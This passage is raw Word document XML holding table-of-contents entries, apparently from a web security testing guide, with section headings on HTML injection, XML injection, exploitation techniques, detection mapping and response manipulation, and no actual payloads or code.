              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408631 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>43</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="572B472E" w14:textId="39DFE27E" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408632" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>HTML Injection</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408632 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>44</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="325695FD" w14:textId="00FC1D25" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408633" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Definition &amp; Threat Model</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408633 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>44</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3EC4E26D" w14:textId="32CD381C" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408634" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Injection Contexts</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408634 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>44</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="222F4F6F" w14:textId="25FB3334" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408635" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Advanced Vectors &amp; Chains</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408635 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>44</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0C071504" w14:textId="52420060" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408636"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_Toc208408636 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>44</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="06BDFD11" w14:textId="52B7FCC2" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408637" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Payload Logic</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408637 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>44</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="41A23B02" w14:textId="7F7D5A58" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408638"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_Toc208408638 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>45</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="07BEA0A9" w14:textId="1E362A88" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408639" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Triage &amp; Impact</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408639 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>45</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="37261A35" w14:textId="6CFB7385" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408640" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>XML Injection</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408640 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>45</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4BC8408A" w14:textId="570B172D" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408641" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>What is XML Injection?</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408641 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>45</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5C60CD71" w14:textId="0A6F6A3E" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408642" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Where XML Injection Happens</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408642 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>45</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="08B643B1" w14:textId="3F072B56" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408643"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_Toc208408643 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>45</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="534F9665" w14:textId="2044F569" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408644" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Exploitation Techniques</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408644 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>45</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2F498A44" w14:textId="372093A0" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408645" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Tools</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408645 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>46</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="334A29EC" w14:textId="6E08098B" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408646"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_Toc208408646 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>46</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3F3706B2" w14:textId="021DA4F9" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408647" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Attack → Detection Map</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408647 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>46</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3D08AAD6" w14:textId="506F5A44" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408648" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Response Manipulation</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408648 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>47</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="108EBB39" w14:textId="604C38A2" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408649" w:history="1">
